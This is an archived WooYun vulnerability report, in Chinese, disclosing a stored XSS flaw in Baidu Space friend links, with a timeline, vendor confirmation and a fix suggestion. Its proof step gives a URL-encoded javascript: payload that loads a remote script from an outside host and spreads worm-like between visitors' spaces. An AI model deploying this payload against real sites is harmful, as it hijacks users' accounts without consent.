{"id": 14902, "wybug_id": "wooyun-2012-015981", "wybug_title": "百度空间友情链接储存反射型XSS跨站脚本漏洞", "wybug_corp": "百度", "wybug_author": "LaiX", "wybug_date": "2012-12-14 11:27", "wybug_open_date": "2013-01-28 11:28", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "存储型", "利用技巧", "技巧", "百度", "百度空间", "蠕虫"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-01-28：\t细节向公众公开  简要描述： 严重程度可构成XSS蠕虫，本人chrome测试成功！ 详细说明：  简单的说就是新版百度空间中友情链接中缺少对JS字符的过滤，导致了储存反射型XSS跨站脚本漏洞。你信不信我反正是信了，下面给出利用方法。   漏洞证明：  1，首先打开自己的百度空间，模板设置-添加友情链接-并在链接处插入恶意代码\njavascript:function%20loadjs%28filename%29%7Bvar%20fileref%3Ddocument.createElement%28%27script%27%29%3Bfileref.setAttribute%28%22type%22%2C%22text%2Fjavascript%22%29%3Bfileref.setAttribute%28%22src%22%2Cfilename%29%3Bif%28typeof%20fileref%21%3D%22undefined%22%29%7Bdocument.getElementsByTagName%28%22head%22%29%5B0%5D.appendChild%28fileref%29%7D%7Dloadjs%28%22http%3A%2F%2Fwt.cnwt.asia%2Fa.js%3Fid%3Dfuck%22%2C%22js%22%29%3Bwindow.open%28%27http%3A%2F%2Ftop.baidu.com%2F%27%29%3B\n\n\n2.随便用一个小号点击刚刚插入恶意代码的百度空间中的友情链接。\n\n3.发现小号的友情链接中多了一个\"百度新鲜事好礼送不停\"的不明友情链接。此时目的已达到。\n\n   修复方案：  经过服务端处理的时候在链接前面加上\"http://\"，再显示出来！   版权声明：转载请注明来源 LaiX@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2012-12-17 10:42 厂商回复： 感谢你对百度安全的关注，我们马上安排处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}